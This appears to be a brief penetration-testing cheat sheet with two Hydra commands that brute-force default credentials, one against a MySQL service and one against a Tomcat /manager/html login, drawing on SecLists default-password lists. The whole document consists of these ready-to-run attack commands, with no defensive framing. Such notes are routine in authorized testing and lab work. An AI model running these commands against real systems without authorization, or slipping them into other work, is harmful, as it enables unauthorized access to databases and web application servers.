# hydra mysql default credentials
```bash
hydra $IP mysql -C /usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt -t 1
```

# hydra tomcat http default credentials
```bash
hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt $IP http-get /manager/html
```
